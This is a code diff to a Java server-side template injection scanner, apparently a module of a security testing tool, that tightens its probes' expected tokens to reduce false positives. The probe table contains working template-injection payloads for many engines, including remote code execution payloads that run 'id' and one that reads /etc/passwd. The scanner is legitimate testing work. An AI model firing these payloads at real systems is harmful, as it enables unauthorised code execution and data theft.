@@ -76,49 +76,54 @@ public class SstiScanner implements ScanModule {
     private static final Map<String, String[][]> ENGINE_PROBES = new LinkedHashMap<>();
 
     static {
+        // Engine identification probes. Expected tokens MUST be unique strings that an
+        // un-evaluated template / a sanitizer-stripped payload / natural page content
+        // cannot produce. Short or common tokens (e.g. "function", "Process", "20",
+        // "[", "test") are forbidden — they FP on any page that happens to contain them.
+        // Probes that cannot meet this bar were dropped rather than tightened.
         ENGINE_PROBES.put("Jinja2", new String[][]{
-                {"{{config}}", "SECRET_KEY|DEBUG|TESTING", "Flask config access"},
-                {"{{self.__class__}}", "TemplateReference|Undefined", "Jinja2 class"},
-                {"{{request.environ}}", "SERVER_NAME|wsgi", "Flask request object"},
-                {"{{[].__class__.__base__.__subclasses__()}}", "subprocess|Popen|Warning", "Python MRO"},
-                {"{{lipsum.__globals__}}", "os|builtins", "Jinja2 lipsum globals"},
+                {"{{config}}", "<Config '", "Flask config access"}, // Flask Config repr: "<Config '...'>"
+                {"{{self.__class__}}", "<class 'jinja2.runtime.TemplateReference'>|<class 'jinja2.environment.TemplateModule'>", "Jinja2 class"},
+                {"{{request.environ}}", "wsgi.url_scheme|wsgi.multithread|wsgi.multiprocess", "Flask request object"},
+                {"{{[].__class__.__base__.__subclasses__()}}", "<class 'subprocess.Popen'>|<class 'warnings.catch_warnings'>", "Python MRO"},
+                {"{{lipsum.__globals__}}", "<module 'os' from|<built-in module", "Jinja2 lipsum globals"},
                 {"{{cycler.__init__.__globals__.os.popen('id').read()}}", "uid=", "Jinja2 RCE via cycler (AGGRESSIVE)"},
-                {"{{()|attr('\\x5f\\x5fclass\\x5f\\x5f')|attr('\\x5f\\x5fbase\\x5f\\x5f')|attr('\\x5f\\x5fsubclasses\\x5f\\x5f')()}}", "subprocess|Popen|Warning", "Jinja2 attr+hex filter bypass"},
-                {"{{().__class__.__mro__[1].__subclasses__()}}", "subprocess|Popen|Warning", "Jinja2 MRO via hex escape"},
+                {"{{()|attr('\\x5f\\x5fclass\\x5f\\x5f')|attr('\\x5f\\x5fbase\\x5f\\x5f')|attr('\\x5f\\x5fsubclasses\\x5f\\x5f')()}}", "<class 'subprocess.Popen'>|<class 'warnings.catch_warnings'>", "Jinja2 attr+hex filter bypass"},
+                {"{{().__class__.__mro__[1].__subclasses__()}}", "<class 'subprocess.Popen'>|<class 'warnings.catch_warnings'>", "Jinja2 MRO via hex escape"},
         });
         ENGINE_PROBES.put("Twig", new String[][]{
-                {"{{_self.env.getFilter('id')}}", "Twig", "Twig self reference"},
+                {"{{_self.env.getFilter('id')}}", "object(Twig\\TwigFilter)|Twig\\TwigFilter#", "Twig self reference"},
                 {"{{'omnistrike_ssti_confirm'|upper}}", "OMNISTRIKE_SSTI_CONFIRM", "Twig filter"},
                 {"{{'133'*7}}", "133133133133133133133", "Twig string repeat"},
-                {"{{_self.env.getRuntimeLoader()}}", "Twig|Runtime", "Twig runtime loader"},
-                {"{{dump(app)}}", "AppVariable|kernel", "Symfony app dump"},
+                {"{{_self.env.getRuntimeLoader()}}", "Twig\\RuntimeLoader\\FactoryRuntimeLoader|Twig\\RuntimeLoader\\ContainerRuntimeLoader", "Twig runtime loader"},
+                {"{{dump(app)}}", "Symfony\\Bundle\\FrameworkBundle\\Templating\\Helper\\AppVariable|object(Symfony\\Bridge\\Twig\\AppVariable)", "Symfony app dump"},
                 {"{{['id']|filter('system')}}", "uid=", "Twig RCE (AGGRESSIVE)"},
                 {"{{['id']|filter('passthru')}}", "uid=", "Twig passthru filter (AGGRESSIVE)"},
-                {"{{'omnistrike'|reduce((a,b)=>a~b)}}", "omnistrike", "Twig reduce filter"},
+                // Dropped: reduce filter probe — "omnistrike" too easily appears via reflection
         });
         ENGINE_PROBES.put("Freemarker", new String[][]{
-                {"${.version}", "2.", "Freemarker version"},
+                // Dropped: ${.version} → "2." matches any decimal anywhere on the page
                 {"${133*991}", SSTI_EXPECTED, "Freemarker eval"},
-                {"${\"freemarker.template.utility.ObjectConstructor\"?new()}", "ObjectConstructor", "Freemarker OC"},
+                {"${\"freemarker.template.utility.ObjectConstructor\"?new()}", "freemarker.template.utility.ObjectConstructor@", "Freemarker OC"}, // toString() includes @hash
                 {"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", "uid=", "Freemarker RCE (AGGRESSIVE)"},
         });
         ENGINE_PROBES.put("Velocity", new String[][]{
                 {"#set($x=133*991)$x", SSTI_EXPECTED, "Velocity set"},
-                {"$class.inspect('java.lang.Runtime')", "Runtime", "Velocity reflection"},
-                {"#set($rt=$class.inspect('java.lang.Runtime').type.getRuntime())$rt.exec('id')", "Process", "Velocity RCE (AGGRESSIVE)"},
+                {"$class.inspect('java.lang.Runtime')", "class java.lang.Runtime", "Velocity reflection"}, // .inspect() returns "class java.lang.Runtime"
+                {"#set($rt=$class.inspect('java.lang.Runtime').type.getRuntime())$rt.exec('id')", "java.lang.UNIXProcess@|java.lang.ProcessImpl@|Process[pid=", "Velocity RCE (AGGRESSIVE)"},
         });
         ENGINE_PROBES.put("Thymeleaf", new String[][]{
                 {"__${133*991}__", SSTI_EXPECTED, "Thymeleaf preprocessor"},
-                {"__${T(java.lang.Runtime).getRuntime().exec('id')}__", "Process", "Thymeleaf RCE (AGGRESSIVE)"},
+                {"__${T(java.lang.Runtime).getRuntime().exec('id')}__", "java.lang.UNIXProcess@|java.lang.ProcessImpl@|Process[pid=", "Thymeleaf RCE (AGGRESSIVE)"},
         });
         ENGINE_PROBES.put("Mako", new String[][]{
                 {"${133*991}", SSTI_EXPECTED, "Mako eval"},
-                {"${self.module.__builtins__}", "builtins", "Mako builtins access"},
+                {"${self.module.__builtins__}", "<module 'builtins'|{'__name__': 'builtins'", "Mako builtins access"}, // repr of builtins module
                 {"<%import os%>${os.popen('id').read()}", "uid=", "Mako RCE (AGGRESSIVE)"},
         });
         ENGINE_PROBES.put("ERB", new String[][]{
                 {"<%= 133*991 %>", SSTI_EXPECTED, "ERB eval"},
-                {"<%= Dir.entries('/') %>", "[", "ERB dir listing"},
+                // Dropped: Dir.entries('/') → "[" — useless single-character match
                 {"<%= system('id') %>", "uid=", "ERB RCE (AGGRESSIVE)"},
         });
         ENGINE_PROBES.put("Pug", new String[][]{
@@ -126,13 +131,14 @@ public class SstiScanner implements ScanModule {
                 {"#{root.process.mainModule.require('child_process').execSync('id')}", "uid=", "Pug RCE (AGGRESSIVE)"},
         });
         ENGINE_PROBES.put("Handlebars", new String[][]{
-                {"{{#each (lookup this \"constructor\")}}{{this}}{{/each}}", "function", "Handlebars constructor lookup"},
+                // constructor lookup serializes "function Object() { [native code] }" — match the distinctive marker
+                {"{{#each (lookup this \"constructor\")}}{{this}}{{/each}}", "{ [native code] }", "Handlebars constructor lookup"},
                 {"{{#if true}}omnistrike_hbs_confirmed{{/if}}", "omnistrike_hbs_confirmed", "Handlebars if helper"},
                 {"{{#with (lookup this \"constructor\")}}{{#with (lookup this \"constructor\")}}{{this (\"return this.process.mainModule.require('child_process').execSync('id')\")}}{{/with}}{{/with}}", "uid=", "Handlebars RCE (AGGRESSIVE)"},
         });
         ENGINE_PROBES.put("Smarty", new String[][]{
                 {"{math equation=\"133*991\"}", SSTI_EXPECTED, "Smarty math"},
-                {"{$smarty.version}", "3.|4.|5.", "Smarty version leak"},
+                // Dropped: {$smarty.version} → "3.|4.|5." matches any version-like decimal
                 {"{if 133*991==131803}131803{/if}", SSTI_EXPECTED, "Smarty if conditional"},
                 {"{php}echo 133*991;{/php}", SSTI_EXPECTED, "Smarty PHP tags (deprecated in v3+)"},
                 {"{if phpinfo()}{/if}", "PHP Version", "Smarty phpinfo (AGGRESSIVE)"},
@@ -148,23 +154,22 @@ public class SstiScanner implements ScanModule {
                 {"{{range.constructor(\"return this.process.mainModule.require('child_process').execSync('id')\")()}}", "uid=", "Nunjucks RCE (AGGRESSIVE)"},
         });
         ENGINE_PROBES.put("Django", new String[][]{
-                {"{% debug %}", "settings|TEMPLATES|INSTALLED_APPS", "Django debug tag"},
-                {"{% load log %}{% get_admin_log 10 as log %}{{log}}", "QuerySet|LogEntry", "Django admin log"},
-                {"{% include 'admin/base.html' %}", "Django|admin|doctype", "Django template include"},
+                {"{% debug %}", "INSTALLED_APPS|MIDDLEWARE_CLASSES|DATABASES", "Django debug tag"}, // Django settings keys, not generic words
+                {"{% load log %}{% get_admin_log 10 as log %}{{log}}", "<QuerySet [<LogEntry:|<LogEntry:", "Django admin log"},
+                // Dropped: {% include 'admin/base.html' %} → "Django|admin|doctype" — "admin"/"doctype" ubiquitous
         });
         ENGINE_PROBES.put("Razor", new String[][]{
                 {"@(133*991)", SSTI_EXPECTED, "Razor eval"},
-                {"@DateTime.Now", "20", "Razor DateTime (year prefix)"},
-                {"@System.IO.Directory.GetCurrentDirectory()", "/|C:\\", "Razor directory listing"},
-                {"@System.Diagnostics.Process.Start(\"id\")", "Process", "Razor RCE (AGGRESSIVE)"},
+                // Dropped: @DateTime.Now → "20" matches almost every page
+                // Dropped: @System.IO.Directory.GetCurrentDirectory() → "/|C:\\" matches almost every page
+                {"@System.Diagnostics.Process.Start(\"id\")", "System.Diagnostics.Process (id)", "Razor RCE (AGGRESSIVE)"}, // Process.ToString() format
         });
         ENGINE_PROBES.put("EJS", new String[][]{
                 {"<%= 133*991 %>", SSTI_EXPECTED, "EJS eval"},
                 {"<%= process.mainModule.require('child_process').execSync('id') %>", "uid=", "EJS RCE (AGGRESSIVE)"},
         });
-        ENGINE_PROBES.put("Mustache", new String[][]{
-                {"{{#list}}test{{/list}}", "test|list", "Mustache section"},
-        });
+        // Mustache: dropped entirely — only probe was {{#list}}test{{/list}} → "test|list",
+        // both of which appear in nearly every page. No reliable safe probe exists for Mustache.
         ENGINE_PROBES.put("Liquid", new String[][]{
                 {"{{ 133 | times: 991 }}", SSTI_EXPECTED, "Liquid filter"},
                 {"{{ 'omnistrike' | upcase }}", "OMNISTRIKE", "Liquid upcase filter"},
@@ -177,12 +182,13 @@ public class SstiScanner implements ScanModule {
         });
         ENGINE_PROBES.put("Plates", new String[][]{
                 {"<?= 133*991 ?>", SSTI_EXPECTED, "Plates short echo"},
-                {"<?= $this->e('omnistrike_confirm') ?>", "omnistrike_confirm", "Plates escape helper"},
+                // Dropped: $this->e('omnistrike_confirm') — expected is a substring of the payload, so
+                // a sanitizer that strips PHP tags but keeps the string content trivially FPs.
         });
         ENGINE_PROBES.put("Groovy", new String[][]{
                 {"${133*991}", SSTI_EXPECTED, "Groovy GString"},
                 {"<% println 133*991 %>", SSTI_EXPECTED, "Groovy template"},
-                {"${\"cat /etc/passwd\".execute().text}", "root:", "Groovy RCE (AGGRESSIVE)"},
+                {"${\"cat /etc/passwd\".execute().text}", "root:x:0:0:", "Groovy RCE (AGGRESSIVE)"}, // tightened: require full passwd marker, not bare "root:"
         });
     }
 
@@ -552,33 +558,50 @@ public class SstiScanner implements ScanModule {
                 if (desc.contains("AGGRESSIVE") && !aggressiveMode) continue;
 
                 try {
-            
+
                     HttpRequestResponse result = sendPayload(original, target, payload);
                     if (result == null || result.response() == null) continue;
 
                     String body = result.response().bodyToString();
+                    if (body == null) body = "";
 
-                    // Check for expected output
+                    // Without a real baseline we can't distinguish naturally-present tokens from
+                    // template evaluation output. Skip rather than guess.
+                    if (baselineBody == null || baselineBody.isEmpty()) continue;
+
+                    // Hard pre-check: if the literal payload (or the unique inner expression)
+                    // appears verbatim in the response, the template was NOT evaluated — the app
+                    // is just reflecting input. Apply this universally; the previous keyword-based
+                    // skip-list let RCE/version/config/class/globals probes through, which was the
+                    // primary FP source when sanitizers reflected the raw payload.
+                    if (body.contains(payload)) continue;
+
+                    // Check for expected output (still requires baseline-diff).
                     boolean matched = false;
+                    String matchedToken = null;
                     if (expected.contains("|")) {
-                        // Multiple possible matches (OR)
                         for (String exp : expected.split("\\|")) {
-                            if (body.contains(exp.trim()) && !baselineBody.contains(exp.trim())) {
+                            String t = exp.trim();
+                            if (t.isEmpty()) continue;
+                            if (body.contains(t) && !baselineBody.contains(t)) {
                                 matched = true;
+                                matchedToken = t;
                                 break;
                             }
                         }
                     } else {
-                        matched = body.contains(expected) && !baselineBody.contains(expected);
+                        if (body.contains(expected) && !baselineBody.contains(expected)) {
+                            matched = true;
+                            matchedToken = expected;
+                        }
                     }
 
                     if (matched) {
-                        // Verify template syntax was consumed (not just reflected)
-                        // Skip this check for RCE payloads (they confirm via command output, not math)
-                        if (!desc.contains("RCE") && !desc.contains("version") && !desc.contains("config")
-                                && !desc.contains("class") && !desc.contains("globals")
-                                && body.contains(payload)) {
-                            continue;  // Raw payload reflected = not evaluated
+                        // Defensive: the matched token must not be a substring of the payload itself.
+                        // If it is, the probe is intrinsically reflection-shaped (e.g. a probe that
+                        // expects its own string literal) and cannot be trusted as engine evidence.
+                        if (matchedToken != null && payload.contains(matchedToken)) {
+                            continue;
                         }
 
                         Severity severity = desc.contains("RCE") ? Severity.CRITICAL : Severity.HIGH;
